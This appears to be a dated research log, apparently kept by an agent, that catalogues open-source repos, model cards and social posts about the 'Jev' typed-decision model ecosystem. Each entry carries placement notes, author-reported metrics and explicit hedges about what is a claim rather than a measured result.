**Ax identity (verified).** [ax-llm/ax](https://github.com/ax-llm/ax)
README, fetched 2026-09-18: "DSPy for TypeScript." Already listed in
`sources.json` (typesafe-provider note). Not a second URL. Not a call
shape. DSPy is the Python counterpart. Both climb LM-program knobs
only: prompts, demonstrations, module graphs, sometimes model choice.
Use on a generative or constrained-AR head (TypeAR, schema-prompted
LLM) and on an optional rewrite of a perception-to-state summary. Do
not expect them to climb SAM multiplex, ASR decoding or diarization,
Jev calibration, or pair-versus-native-omni. Proprietary Jev: schema,
criteria, and thresholds on labeled eval (jevals), not a search over a
decoder. Nimble: data curation and LoRA; published holdout is agreement
on synthetic labels, not a measured ECE (§35).

**Card.** `validation.md` pipeline section. Cross-links: perception
card (`judgment-class.md`, §39), entropy allocator (§38, not a meter),
Eval & hill-climb (§40 — Harbor / Verifiers / jevals hygiene, not
restated). One-liner in `mental-models.md`. One hill-climb pointer in
`formal-methods.md`; the versioned-contract sentence was already there
and was not rewritten. Judgment paragraph in
`optimizer-integration.md` with no new call shape. Mapping-index row
and description triggers only.

**Does not contradict.** Meijer: marginals at the decision stage;
joints across stages live in code. Atallah: rhetoric, not a meter;
"review this PR" is partly generative; "first model ever" is a claim.
openjev-lm keeps that spelling. Fail-open is not universal. A Noul is
not a proof and is not over raw pixels. **Hypothesis.** No CLI, env,
port, or install.

## 42. Hourly fold ~11:59 America/Boise (2026-09-18) — serving, meta-VOI, env vs policy, store, games

Window: America/Boise ~11:59 ≈ 17:59 UTC. Novel versus §33 (~11:02).
Docs-only. No Jev wrapper, no serving-stack how-to, no copied
`predict()` / env / hook regex / OpenAPI. Local path
`/workspace/jev-archive/2026-09-18/175905` was not present this pass;
GitHub READMEs, Hub cards, and X posts fetched live. HTTP 200 on every
cited URL below. Archer drop still **WATCH**: Hub `archerhume` /
`4rcherhume` empty; latest `@4rcherhume` posts this calendar day are
replies (newest 14:39Z "I realise that now…"). Expected ~19 Sep Boise.

Five frames, then the artifacts.

**(a) Three open paths, not three species.** Encoder open-jev
(DeBERTa), AR constrained decode (TypeAR + native serving), trained
decision-only (Laya / Nimble / Archer Watch). Constrained softmax over
allowed tokens is still not a Noul.

**(b) Meta-VOI.** Abstain from calling *any* model when a regex, DNS
lookup, or query already answers. The System One band is "a sensible
person answers in under a second from text you can show them."

**(c) Env-break vs policy-break.** OpenSmoke's cut is already the
harness-triage card; this hour the README names it: `env_broken` as
opposed to the agent's own bug; pre-mortem of a new sandbox *before*
users meet it.

**(d) Store as decision surface.** Vanilla Postgres never learns
`jev()`; the CLI judges schema-conditioned row objects. Cheap SQL
first; row contents leave the database.

**(e) Game loops as calibration / hill-climb substrate.** Legal moves
from code; Choice over that set; option-order and confidence-vs-correct
are the tests. Probabilities are not win odds.

### HIGH

1. **[`stephanj/pcdServer`](https://github.com/stephanj/pcdServer)**
   (created 17:06Z, MIT, C++20, 0★ this pass). Native Parallel
   Constrained Decoder REST for Apple Silicon (Metal) and Linux
   (llama.cpp GGUF). Same *family* as TypeAR (§32): next-token
   constraint, not a proper-scoring head. Differences that matter for
   placement: 2–256 string choices per field (TypeAR README enums
   ≤16); 1–63 parallel fields sharing one prefix checkpoint; booleans
   as `[false, true]`; collision-tree for shared prefixes; full
   sequence checkpoints because Qwen3.5 hybrid recurrent state cannot
   be partially rewound. Default demo GGUF is Qwen3.5-0.8B-Q8_0. The
   model never writes JSON syntax; the server assembles values from
   allowed scalars and returns a softmax over those scalars. That
   distribution is still not a Noul. Tetris view: every piece is one
   decode — game loop as a constrained-decode demo, not a strength
   claim. No auth; default bind is loopback. Cousin of the same
   author's `parallelConstraintDecoding` (already in the ecosystem
   snapshot). Do not copy OpenAPI, flags, or install. Card:
   `judgment-class.md` constrained-AR row.

2. **[`kylemclaren/jevql`](https://github.com/kylemclaren/jevql)**
   (already in the gallery; this hour the *store* frame). Semantic SQL
   over vanilla Postgres: `jev` / `jev_prob` / `jev_choice` /
   `jev_score` as schema-conditioned typed questions on row objects.
   The database only ever sees ordinary SQL. Full scan of the
   post-SQL-filter row set — indexed predicates first; `--explain`
   counts before you pay. Row contents go to TypeSafe: same residency
   warning as AU health (§33). Not a Postgres extension. Do not copy
   connection strings. `mixed-architecture.md` gallery; `mappings.md`
   §4.

3. **[`aaravriyer193/OpenSmoke`](https://github.com/aaravriyer193/OpenSmoke)**
   (already §3; this hour the cut is explicit). Per step, one request:
   Noul `env_broken` *as opposed to* the agent's own bug; Choice
   category (`missing_credential`, `broken_tool`, `network`, …);
   Noul `workaround`. Run status silent / disclosed / recovered /
   clean. Heuristic judge on 12 labeled traces: precision = recall =
   0.86; `jev-1.13` "not yet measured" on that fixture — do not invent
   a number. Pre-mortem shape: scan an eval suite against a new
   sandbox image and fail the build on *silent* env-breaks. Motivating
   case unchanged (KeyError then "Done!"). `applied-mappings.md` §3.

4. **[`ddfeyes/jev-mode`](https://github.com/ddfeyes/jev-mode)**
   (created 14:51Z, MIT, Python, 0★). Move bulk semantic judgments out
   of frontier context (triage 400 tickets, tag files, six-way route)
   onto a typed decision model. Measured on 1,000 synthetic triage
   judgments vs a Jev-free control: −77.8% tokens, 16× less
   work-attributable input, 40→14 round trips; department accuracy
   96.1% vs 93.7%. Author's own hedges: control ranged 93.4–98.2% so
   the honest claim is **parity**, not superiority; corpus is
   synthetic so the **token ratio** is the durable result. Question
   design moved 5–12 points (one terse Choice beats nine atomic
   Nouls; one record per call). Step gate: fail-open; consecutive
   denial budget (lifetime budget was wrong); `unsafe` recorded not
   enforced. Latency-class split: leaving those 400 tickets in the
   frontier loop **stalls** later turns (re-read tax); moving them
   off **degrades the frontier to render/write**. Same axis as
   Atallah (§38), not a new meter. Do not copy the client. Cards:
   `mixed-architecture.md`; `applied-mappings.md` §5.

5. **[`runta-dev/jot`](https://github.com/runta-dev/jot)** (created
   10:46Z, license file absent, 1★). "First general-purpose System One
   agent" is a **claim**. Loop: closed tool catalog → Jev picks a
   call → host executes → result back into state. Calculator does the
   arithmetic. That is dual-orchestration topology B with a *closed*
   catalog (`mixed-architecture.md`), not a license to invent tools.
   Hypothesis as a shell; standing red flag if the catalog is open.
   Do not copy `.env`.

6. **[`wotai-dev/typesafe-jev-tools`](https://github.com/wotai-dev/typesafe-jev-tools)**
   (created 17:04Z, MIT, 0★). Claude Code hook that asks whether the
   decision *being written* needs a model at all. Three-way test:
   (1) regex / DNS / query → write the code; (2) multi-step reasoning
   or generated prose → frontier; (3) one-second human from shown text
   → System One. Never blocks; recommends plain code at least as
   often. **Empirical as a 149-row receipt, 2026-09-18, same business
   rows:** Jev `jev-1.13.0` 79.9% / p50 432 ms / p95 620 ms / 507 in +
   84 out tok; Claude Haiku 4.5 **83.2%** / 702 / 1,244 / 422 + 19.
   Agreed 143/149. Jev 1.6× faster, **not** the 20–200× landing-page
   band. Jev accuracy climbs monotonically with stated confidence
   (0.00–0.60: 28.6%; 0.95–1.00: 93.9%). Haiku **inverts** in
   0.80–0.95 (55.2%). Haiku produced 10 distinct confidence values and
   put 0.95 on 98/149; Jev 32. TypeSafe `/pricing` and `/limits` both
   404 this day, so "40 to 1,000× cheaper" is not checkable. Punchline
   the hook exists for: if your code does not *branch on confidence*,
   use whatever you already have. Do not copy the hook matcher. Cards:
   `mappings.md` §6; `mental-models.md` VOI; FAQ.

### MED

7. **[`memovai/openevals`](https://github.com/memovai/openevals)**
   (created 07:43Z, MIT, 1★). Online, every trace, every step, written
   back to Langfuse. Code graders first (free, crisp); Jev per-step
   four questions (progress / on_task / redundant / corrective);
   low-confidence / Noul≈0.5 escalates. Calibration vs human
   ANNOTATION scores (κ, MAE, false-pass). Adjacent to jevals/Harbor
   (§40): Harbor is an offline product taskset; this is production
   full-traffic measurement. Same full-traffic portent already in
   `judgment-class.md`. Do not copy env. `validation.md` one sentence.

8. **[`poponline63/hermes-jev-north-star`](https://github.com/poponline63/hermes-jev-north-star)**
   (created 10:37Z, MIT, 1★). Intention → checkable finish line.
   Two-layer gate: deterministic shell checks first (failure
   short-circuits); empty evidence **refuses to judge**; then one Jev
   call (Noul every-requirement, Score progress, Choice weakest).
   Empty state was self-contradictory (0.14 done beside "nothing
   met") — that is why the refuse-empty rule exists. Numbers move
   between calls on the same state: treat the threshold as coarse;
   deterministic checks are load-bearing. `mappings.md` §18 / §12.

9. **[`TheoOliveira/pi-jev`](https://github.com/TheoOliveira/pi-jev)**
   (created 17 Sep, MIT, 6★). Semantic tool/skill routing + typed
   `jev_evaluate` for the Pi coding agent. **Not**
   `kevinpita/pi-jev-context` (sieve). Fail-open to local keyword
   shortlists. Auto-mode / compaction / auto-model are opt-in.
   `applied-mappings.md` §5.

10. **`rajdhakad9826/routeKit`** — already §33. Still Hypothesis until
    *your* catalog. No rewrite.

11. **[`vtrivedy/jev-plays-games`](https://github.com/vtrivedy/jev-plays-games)**
    (created 17:57Z, license file absent, 0★). Chess / Connect Four.
    Board → legal moves from code → one Choice over that set →
    validate. Text state, no screenshot. Choice probabilities **are
    not win odds**. Probe (author, 12 paid calls, both option orders):
    both chess mates found; Connect Four immediate win missed once
    under reversed order; Fool's-mate confidence 31% and 37% — a 0.50
    gate would reject both correct mates. Self-play chess hung a queen
    on move 2 and drew by repetition; Connect Four filled columns then
    won the bottom row. Small selected sample; reversing options is a
    new call, so it does not isolate IIA from request noise. Hill-climb
    substrate: option-order, confidence-vs-correct, state-format
    ablations. `mappings.md` §9; `validation.md`.

12. **[`ant4g0nist/joxide`](https://github.com/ant4g0nist/joxide)**
    (created 17:36Z, license file absent, 0★). zoxide owns the index;
    Jev scores a shortlist of known directories by description.
    Destinations come only from existing local paths. Fail-open (API
    error leaves you where you were). Thresholds are initial policy,
    not calibrated guarantees. `mappings.md` §4.

13. **[`convaiinnovations/laya-typed-decisions`](https://huggingface.co/convaiinnovations/laya-typed-decisions)**
    (created 17:45Z, apache-2.0, 421.3M — same parameter count as
    `convaiinnovations/laya`). Companion packaging: Hub tags
    `typed-decisions` / `system-one` / `rlcd`; model-index on
    `LocalLLaMA/typed-decisions` acc **0.766** / Brier **0.066**,
    `verified: false`. Not a new architecture. Do not overwrite §18
    ECE claims. Point at Laya as the trained decision-only open path.

### X discourse this hour (verified)

- [@jsmagoon](https://x.com/jsmagoon/status/2101008113952567316)
  (17:59:03Z): "dynamic classifiers based on user input" / "derive the
  output schema at runtime." Still a **closed set at request time**.
  Not generation. IIA/envelope still apply.
- [@yoheinakajima](https://x.com/yoheinakajima/status/2101008182521037242)
  (17:59:20Z): chat/beep sees typing live; Enter clears. Live
  keystroke sieve — judge on partial state; sequence-tagged staleness
  already in the latency-first archive. Hypothesis as a number.
- [@IAmMattGreen](https://x.com/IAmMattGreen/status/2101008081962614823)
  (17:58:56Z): a use-case "could immediately cut our costs by 60%."
  **Claim**, not a labeled receipt.
- [@mrluiscalderon](https://x.com/mrluiscalderon/status/2101007751098851382)
  (17:57:37Z): Coach testing "~20× faster"; "quality still needs
  verification."
- [@thePartyPartyUS](https://x.com/thePartyPartyUS/status/2101007875313205573)
  (17:58:06Z): "classifiers are cheap… jump on GLiNER." Species-map
  lesson already taught; do not adopt "Jev will be discarded."
- [@Yash_Bhadange07](https://x.com/Yash_Bhadange07/status/2101007720195498235)
  (17:57:29Z): closed Jev → FunctionGemma for Android tool calling.
  Same hole as jev-mobile / AU residency: deployment control, not a
  FunctionGemma tutorial.
- [@linfluence](https://x.com/linfluence/status/2101008235385794628)
  (17:59:32Z): fintech / market-structure; LLMs price on a paragraph a
  user reads; software-native unit is a decision.
- [@brunoqgalvao](https://x.com/brunoqgalvao/status/2101008125356626019)
  (17:59:06Z): takeaway — new Pareto of performance/cost will drive
  many use cases, especially latency. The numbered receipt he is
  closing (16:53Z, ~1,200 items, four classification tasks): Jev
  91–96% vs flash 96–99%; 23× faster and 39× cheaper than flash at
  1–5 accuracy points; yes/no ECE 8–15% over-hedge vs flash 0.5–2%.
  **Author-reported**, not re-run. Ranking "is good though." Do not
  overwrite in-dist ECE 0.0313 (§7) with this phishing-set ECE.

Cards: `judgment-class.md` three open paths + pcdServer on the TypeAR
row; FAQ; `applied-mappings.md` §3 / §5; `mappings.md` §4 / §6 / §9 /
§18; `mixed-architecture.md` gallery + topology B; `mental-models.md`
VOI; `validation.md` games + openevals; `formal-methods.md` softmax
still isn't a proof.

## 43. Second adversarial pass (2026-09-18) — review findings, not doctrine

Read-only pass on HEAD `7b3a0c3` (whole skill, not only the diff).
Prior memo is §27 at `31c8914`. §27 fixes still held: per-action fail
policy, Nimble license split, openjev-lm 92.9 vs 98.1, Archer Watch,
Ward as ZIO, jevgate constants not universal, Noul is not a proof.
Zero blockers. Four candidates dropped after a second read (Harbor
"first fully supported" is verbatim in the verifiers v1 post;
`mini-jev-runs` has two legitimate uses; SKILL.md "translation-invariant"
names the discriminative family; SREGym 20/50→24/50 is attempt-level,
improved/regressed is over 10 faults).

Kept, and patched in the cards:

1. `validation.md` named `npx jevals` as a verified entry. PRODUCT.md at
   `af6fecc` says no npm publication. The command is gone from the card.
   Flags, keys, and ports stay in that README.
2. SAM 3.1 and ASR were called the **perceive** species. Perceive scores
   candidates you already extracted (CLIP / SigLIP / region Choice).
   Masks and transcripts are upstream producers. `judgment-class.md`,
   `docs/ecosystem.md`. §39's species sentence corrected above.
3. `optimizer-integration.md` said "no call shape" and then showed
   `ai({name:'typesafe'})` and `paw.compile(...)`. Those two forms are
   gone. Seat names stay. `paw.compile` had no symbol in the archive.
4. Proprietary Jev latency cell now tags ~$0.042/MTok as their figure;
   `/pricing` 404 on this day (§42).
5. GodsBoy 94.4% in `applied-mappings.md` §5 now says exploratory
   (questions revised after the first full run). §7 already had the
   leakage note.

Not patched, standing risk: doctrine is copied across cards and the
next fold is where copies drift; `notes.md` §1 is a one-day pin, not a
live contract.

## 44. Hourly fold ~12:58 America/Boise (2026-09-18) — store siblings, hard envelopes, distill-to-device, harness practice

Window: America/Boise ~12:58 ≈ 18:58 UTC. Watch run 185349. Novel
versus §42 (~11:59). Docs-only. No Jev wrapper, no serving-stack
how-to, no copied SQL/`advise()`/proxy ports/`predict()`. Local
`/workspace/jev-archive` path for this run was not present; GitHub
READMEs, Hub cards, and X posts fetched live. HTTP 200 on cited URLs.
**Archer drop still WATCH** — no architecture rewrite this hour. User
watch says ~65% done, Qwen3.8-27B multimodal no-audio still expected
~19 Sep Boise. This pass did not retrieve a new Archer status tweet
(rate-limit / query constraint); Hub was not treated as a landing.

Do **not** rehash pcdServer, jevql's already-folded CLI frame,
OpenSmoke, jev-mode, jot, typesafe-jev-tools, openevals,
hermes-north-star. Already-folded HIGH from §33 (jev-harness,
openjev-lm, jev-gate-student-b, open-jev-deberta, mini-jev-runs,
jev-tree-choice-cap, jev-pref) get a *frame*, not a second card.

Six frames, then the artifacts.

**(a) Structured-store semantic index.** Cheap exact predicates first;
typed questions on the remainder. Two *forks* of the same hole:
**in-engine extension** (`mgaitan/sqlite-jev`; inspired by
`realZachi/pg-jev`) vs **out-of-process CLI** (`kylemclaren/jevql` —
vanilla Postgres never sees `jev()`). zoxide (`joxide`, §42) is the
same hole over a path index. A semantic full scan is not an index.
Row contents leave the store: same residency warning as AU health
(§33).

**(b) Distill-to-device memory/context gates.** System One as a
**sieve**, not only an action permit. Already §33 / `applied-mappings.md`
§1: `jev-gate-student-b` P(relevant) from yes/no logits. This hour the
meta is: vector recall → local yes/no gate → inject or stub. Fail-open
on errors. Teacher-copy ≠ gold.

**(c) Encoder vs AR open replicas.** Already the three-open-paths cut
(§42). Encoder DeBERTa = public gold, OOD drop; decoder LoRA
(openjev-lm, jev-gate) = teacher-copy; constrained AR (TypeAR /
pcdServer) = softmax over allowed tokens, not a Noul. Do not pick a
path until meta-VOI says a model is needed at all.

**(d) Soft judgment inside a hard safety envelope.** The model may
only **match the envelope or be more conservative**. Deterministic
policy is load-bearing; missing the model must still be safe.
bitrate-advisor is the named live-stream shape. mmalisper's JOB
planner is the named search/control shape (Postgres plans first; Jev
overrides only when confident).

**(e) Perception → decision.** ASR / vision produce schema'd state;
System One decides; code acts. SAM and ASR are **producers**, not the
perceive species (§43). `jev-voice-control` is a README-only stub of
that pipeline.

**(f) Harbor/jevals-style harness + shadow + confidence.** Assert on
the **action**, not on free text. LLM-as-judge is not the primary
System One score (`faq.md`). jev-harness already named this; this hour
the practice is first-class: recipes across alerts / RTB / sports-bet /
prediction-markets, offline fixtures, shadow until evals pass.

### HIGH

1. **[`mgaitan/sqlite-jev`](https://github.com/mgaitan/sqlite-jev)**
   (created 18:25Z, C, license file absent, 0★). Loadable SQLite
   extension: batched NL Noul/Choice/Score over row objects
   (`jev_rows` virtual table; up to 40 rows per shared state).
   Inspired by [`realZachi/pg-jev`](https://github.com/realZachi/pg-jev)
   (in-engine Postgres, 152★ this pass — pointer, not a second card).
   Sibling *pattern* to jevql, **not** the same serving choice: here
   the database *does* see `jev()` as SQL. README limits: semantic
   full scan, not an index; deterministic SQLite filters first;
   `max_rows` is a spend guard; row contents go to TypeSafe. Thresholds
   stay in SQL so they can rise with false-positive cost. Mock-server
   tests never call TypeSafe. Do not copy `.load`, env, or SQL
   signatures. Card: `mappings.md` §4.

2. **[`AntonioCoppe/jev-harness`](https://github.com/AntonioCoppe/jev-harness)**
   — already §33 (policy, confidence gate, shadow, 24-row 48.9s Claude
   CLI → 1.3s Jev). This hour the *practice*: Harbor/jevals-adjacent
   measurement substrate. Eval CLI asserts on the **action**, not on
   prose. Recipes span alerts, NL row-filter, high-freq reflex (order /
   RTB / fraud), prediction-market and sports-bet gates — business and
   life, not SWE-only. Explicitly **not** a `/compact` replacement.
   Do not copy the client. `validation.md`; gallery.

3. **[`DECRUX9812/openjev-lm`](https://github.com/DECRUX9812/openjev-lm)**
   — already §25. This hour the *receipts pattern*: overnight 6-vCPU,
   $0/call, two independently written harnesses both 65/70 = 92.9% on
   the same 70 hand-gold rows; 98.1% on 106 later postings is teacher
   **agreement**, not gold; rare-class cells are one-row wide. Encoder
   vs this decoder LoRA is the (c) fork, not a new architecture. Do
   not copy train commands.

4. **`SargeDev/jev-gate-student-b` + `jev-distill-corpus`** — already
   §33. This hour the meta: **context sieve / memory gate**, not only
   an action gate. Vector recall → P(relevant) yes/no logits → inject
   or stub. Fail-open. Teacher-copy. `applied-mappings.md` §1.

5. **`com-kotobalabs/open-jev-deberta-v3-large`** — already §33
   (434M, Banking77/SST5/BoolQ, in-domain ECE 0.022, OOD acc 0.690).
   This hour: the **encoder** arm of open-replica, as opposed to
   decoder LoRA (openjev-lm / jev-gate) and constrained AR. Public
   gold, not a Jev teacher. Do not overwrite those numbers.

### MED

6. **[`affirmitv/bitrate-advisor`](https://github.com/affirmitv/bitrate-advisor)**
   (created 15:27Z, MIT, TypeScript, 0★). Live-stream ABR: Jev
   proposes initial rung / ceiling / resolution / next step from
   telemetry + venue/carrier history; **deterministic policy fences
   it in**. Jev may be as bold as the measured network allows and as
   cautious as it likes, **never bolder**. Without an API key the same
   call returns the policy's answer (`source: "policy"`). Power plan
   (finish-the-game battery/thermal) is deterministic; Jev may only
   make it more conservative. Author-measured 2026-09-18, three
   states, OpenRouter billed ~$0.000041–0.000044, 0.25–0.39 s; ~$0.015
   per hour of stream at one decision / 10 s — **author-reported**,
   not re-run. Domain: youth-sports phone streams (life / business),
   not a codec tutorial. Empirical as a *shape* for §12 / §15 / §18.
   Do not copy `advise()` or keys.

7. **[`chris-wozniczek/jev-voice-control`](https://github.com/chris-wozniczek/jev-voice-control)**
   (created 18:47Z, license absent, README-only this pass, 0★).
   Speech → Jev typed decisions → macOS actions. Menu-bar Swift
   **claim**. Hypothesis as a product; useful as the perception→decision
   pipeline with ASR as producer (§39 / §43). Do not invent a Swift
   API.

8. **`doeixd/jev-pref`** — already the preference-lint contract
   (YOU define the rule / Jev classifies / code maps outcome). No
   rewrite. This hour it sits next to bitrate's envelope: policy-as-
   prefs is the same ownership split on a diff instead of a live
   stream.

9. **[`nekowasabi/jev-routing`](https://github.com/nekowasabi/jev-routing)**
   (created 08:13Z, MIT, Go, 0★). Host **adapter**, not an MCP
   server: one Go binary in front of Claude Code / Codex / Grok
   Build. Compacts tool results (verbatim drop/truncate, same
   contract as fast-jev-compaction), then one Choice (next tool) +
   Noul (done), then shrinks `tools[]` to **one schema**. README:
   adding this via `mcp add` makes the catalog *worse*. No key →
   on-device classifier. Do not copy ports, env, or install.
   Host-adapter breadth, not a new species. `applied-mappings.md` §5.

10. **[`trietphan/jev-claw`](https://github.com/trietphan/jev-claw)**
    (created 18:44Z, MIT, JS, 0★). Typed routing for OpenClaw
    agents. **Jev classifies** (task_type / complexity / risk /
    second-opinion); **`decide()` in code** maps to a route.
    Sensitive-path regex floors risk even if Jev underrates a
    migration. Confidence is the **minimum** across classifications,
    not the average. 11 offline policy tests (no network). Live eval
    10/10 on the author's 10 samples — **author-reported**, tiny.
    Same hole as routeKit (§33): Jev does not get to skip the
    escalation `if`. Do not copy the eight route names as doctrine.

11. **[`gamesonrblx/JevML`](https://github.com/gamesonrblx/JevML)**
    (created 18:47Z, license absent, README-only, 0★). "PCA / MCMC /
    text-diffusion / NCA primitives + a harness that picks the right
    tool." Meta-VOI adjacent: which primitive, if any. Hypothesis.
    Do not invent those APIs.

12. **`Mikhail/mini-jev-runs`** — already §33 (27.9k option-logit
    runs, frozen Qwen3-4B, no token generated). Calibration /
    constrained-decode corpus. No rewrite.

13. **`reachjalil/jev-tree-choice-cap`** — already §33 / mappings §5.
    Hierarchical Choice under the 255 cap. No rewrite.

### X discourse this hour (verified)

- [@mmalisper](https://x.com/mmalisper/status/2101001041903009987)
  (17:30:57Z) and thread: Jev-assisted Postgres query planner on the
  Join Order Benchmark. Join-order Choice **2× slower** (defaulted to
  smallest table). Cardinality estimates helped when outside context
  informed the plan; when Jev was wrong, one query was an **order of
  magnitude slower**. Hybrid: Postgres plans first; Jev overrides
  **only when confident** → **+12% geomean**, no dramatic slowdowns.
  Downside: a Jev call is 100s of ms, not yet practical on every
  plan. **Author-reported**, not re-run. Frame (d) + search/control
  (§9): the planner is the envelope; confidence is the gate.
  Fail-open to Postgres.

- [@higgsfield_ai](https://x.com/higgsfield_ai/status/2101022473248727177)
  (18:56:07Z) and [demo](https://x.com/higgsfield_ai/status/2101022133753430365)
  (18:54:46Z): "perfect use case" — Jev auto-routes GenAI (video/image)
  models for cost/speed/quality on the Higgsfield API. **Claim**, no
  labeled catalog receipt. Same hole as routeKit / jev-claw:
  classify requirements, policy picks the generator. Hypothesis
  until *your* catalog.

Cards: `mappings.md` §4 / §9 / §12 / §15 / §18; `mixed-architecture.md`
gallery + host-adapter note; `applied-mappings.md` §1 / §5;
`validation.md` harness practice; `mental-models.md` envelope +
planner; FAQ in-engine vs CLI; `judgment-class.md` encoder vs decoder
replica (no new species). No wrapper.

## 45. kev — runnable Archer reconstruction, not a distill (2026-09-18)

HTTP 200 this pass:
[jaredpalmer/kev](https://github.com/jaredpalmer/kev) README (raw
`main`), [MODEL_CARD.md](https://github.com/jaredpalmer/kev/blob/main/MODEL_CARD.md),
[LICENSE](https://github.com/jaredpalmer/kev/blob/main/LICENSE)
(Apache-2.0; GitHub API `license.key` apache-2.0),
[release v0.1.0](https://github.com/jaredpalmer/kev/releases/tag/v0.1.0),
[Archer Hume, *Jev's Architecture Unmasked*](https://archerhume.com/posts/jevs-architecture-unmasked)
(with and without trailing slash), TypeSafe
[System One API](https://docs.typesafe.ai/api).

GitHub API this pass: created 2026-09-17T20:49:39Z; pushed
2026-09-18T19:50:58Z; 24★; language TypeScript (playground); default
branch `main`. Description: "tiny Jev-like model built on top of
Qwen2.5-0.5B you can train and run on your MacBook." Not
`Kevthetech143/super-jev`.

**What it is (Contract as README + model card).** Jared Palmer, Apache-2.0
adapter/head (Qwen2.5-0.5B under the Qwen license). LoRA (r=16) + a
pointer readout on that 0.5B causal backbone. Typed questions in,
calibrated probabilities out, one prefill pass, no decode. State and
questions packed into one sequence; a block-causal mask lets each
question see the document and never a sibling. The pointer head scores
each option against the question's `<decide>` token and softmaxes.
Trained with cross-entropy against labelled outcomes. Architecture
explicitly follows Hume's reconstruction (§31): shared state, isolated
questions, pointer head, CE vs labelled outcomes. API follows TypeSafe
`POST /v1/systemone`; official `typesafe-sdk` works with a `base_url`
change. Weights `kev-0.5b` (38 MB: LoRA adapter, readout head,
tokenizer) on GitHub release v0.1.0; base model from the Hub on first
load. Trains ~1h45m on an Apple M5; ~160 ms for a six-question
request. Model card: research prototype, not production, not Jev.
Do not copy serve flags, ports, or train commands into skill cards.

**Not a distill.** Six public datasets converted to TypeSafe-shaped
requests (Banking77, AG News, MNLI, BoolQ, SST-5, Yelp): 9,000 records,
13,500 questions, two epochs. No LLM-generated data. Distinct from
openjev-lm / jev-gate on the *same* 0.5B backbone: those copy a hosted
Jev teacher. Distinct from Nimble: 9B contrastive synthetic labels, no
measured ECE. Distinct from encoder open-jev: bidirectional DeBERTa,
OOD drop measured. Distinct from TypeAR / pcdServer: those decode a
constrained next token. Distinct from proprietary Jev: closed weights,
~32k envelope. Distinct from Archer Watch: 27B announced, multimodal,
no Hub weights this pass.

**Evidence (README / model card; not re-run; Empirical as their named
receipt).** Isolation exact: packed vs separate max Δ **3.7e-6**;
secret-in-sibling / absent / in-state **p = 0.03 / 0.03 / 0.99**.
Held-out ECE **0.065** (10 bins) on 1,350 ID questions; **0.031** after
one-parameter temperature scaling (T=1.47). Overall acc **0.799**.
Permute (4 orders, Choice K ≥ 3): argmax flips **7.4%**. IIA: log-odds
shift from one irrelevant option **mean 0.13**, p90 0.34. Boundary
forgery: option count unchanged, forged option p ≤ 0.09. Per-source
cells (acc / ECE) stay in the model card; do not promote them into a
ranking against Jev.

**Honest limits (their words).** 0.5B knowledge (on the TypeSafe docs'
structured-criteria example kev picks `return_policy` where Jev picks
`return_status`). Calibration is in-distribution; ECE on the training
datasets says nothing about a new workflow. Not multimodal. Trained at
384 state / 1,024 branch tokens; serving caps at 8,192 vs Jev ~32k.
Score confidence is a stand-in; TypeSafe has not published theirs.
Choice `confidence` uses `(p_max − 1/K) / (1 − 1/K)` — the same
arithmetic Hume reconstructed in the official adapter (§31), as *their*
API derivation, not a TypeSafe contract.

**Placement.** (a) trained decision-only open path next to Laya / Nimble
/ Archer Watch; (b) cleanest *runnable* productization of Archer's
reconstruction (API-compatible); (c) contrast vs TypeAR (constrained
AR decode) vs encoder open-jev vs proprietary Jev; (d) jevals/Harbor
bake-off candidate; mechanism tests mirror Archer probes — they
falsify the reconstruction, they do not prove kev = Jev; (e) when to
use: laptop-local System One API drop-in for development/eval; not a
knowledge/frontier substitute. **Empirical** as a public repo + named
ID receipt. **Hypothesis** that it substitutes for Jev on *your*
labels. Cards: `judgment-class.md`; FAQ; `validation.md`;
`mental-models.md`; `mixed-architecture.md`; `formal-methods.md`
(pointer-softmax is still a sensor); `optimizer-integration.md`.
No wrapper.

### Delta (~14:35 Boise) — Hub weights, PEFT task_type, NOTA training

Not a rewrite of §45. No architecture species change. HTTP 200 this
pass: Hub [`jaredpalmer/kev-0.5b`](https://huggingface.co/jaredpalmer/kev-0.5b)
(Apache-2.0 adapter; `peft` / `text-classification` card); GitHub
README now names that Hub id as the fetch path; release tarball
remains. GitHub this pass: **61★**, pushed ~20:29Z (signal had 53★).
Do not copy `--run` / publish flags into skill cards.

1. **Hub weights.** `kev.publish` uploads the adapter; `--run` accepts
   Hub ids (`jaredpalmer/kev-0.5b`); the Qwen2.5-0.5B base still
   downloads on first load. Bake-off fetch path for jevals/Harbor
   (`validation.md`).
2. **PEFT.** `LoraConfig(task_type="FEATURE_EXTRACTION")` (`kev/model.py`).
   Publish patches legacy adapters that saved `task_type` null (Hub
   warns; PEFT treats both the same on a bare backbone). Docs mention
   only kev-0.5b. Pointer readout, not a new species.
3. **HIGH — `none_of_the_above` is a training question, not only a
   request hatch.** First training run learned "this wording ⇒ pick
   it" when NOTA appeared only as the correct answer (`kev/data.py`
   comment). Fix: add NOTA as a **wrong alternative** too
   (`p_none_distract`); vary wording (`NONE_OPTIONS`: "None of the
   above" / "Something else" / "Not listed here" / …); dedicated
   `test_none_of_the_above` (true option still present → little mass
   on none; true option removed → pick none; a shortcut model picks
   it in both cases). **No published rates this pass — do not
   invent them.** Model card already augments with p=0.10
   true→`other: None of the above`; the *delta* is confronting the
   hatch as a distractor as well. Cross-link wellposed / Choice
   `"other"`: request-shape lint puts the residual option on the
   offered set; **training must confront that option** or the hatch
   becomes a wording shortcut. Cards: `question-design.md`; FAQ
   forced Choice; `validation.md`.

## 46. 14:03 Boise hourly — open multimodal RLCD, bake-off substrate, decision-token LoRA (2026-09-18)

America/Boise 14:03 = 20:03 UTC. Docs-only fold into PR #2
(`cursor/augustus-store-envelope-00b4`). Archer Hume 27B drop still
**WATCH** (Hub authors `archerhume` / `4rcherhume` empty this pass;
user watch still ~2026-09-19). No invented metrics. Frames first,
not a hit list. Identity lock vs `typesafe-ai` / `tenbin` /
`decision-first` holds. No wrapper, no serve how-to.

HTTP 200 / Hub fetch this pass:
[`BlackwoodAI/blackwood-rlcd`](https://huggingface.co/BlackwoodAI/blackwood-rlcd)
README; [`pngwn/open-jev-laya-bench`](https://huggingface.co/datasets/pngwn/open-jev-laya-bench)
`RESULTS.md` (no dataset README); [`Foodoo1/Qwen3-14B-RLCD-Decision-LoRA`](https://huggingface.co/Foodoo1/Qwen3-14B-RLCD-Decision-LoRA)
README; GitHub READMEs for
[`thevibeworks/jevgate`](https://github.com/thevibeworks/jevgate),
[`suraj-phanindra/wellposed`](https://github.com/suraj-phanindra/wellposed),
[`khordoo/jev-reflex-autonomy-lab`](https://github.com/khordoo/jev-reflex-autonomy-lab),
[`Wany-i/jev-decision-layer`](https://github.com/Wany-i/jev-decision-layer),
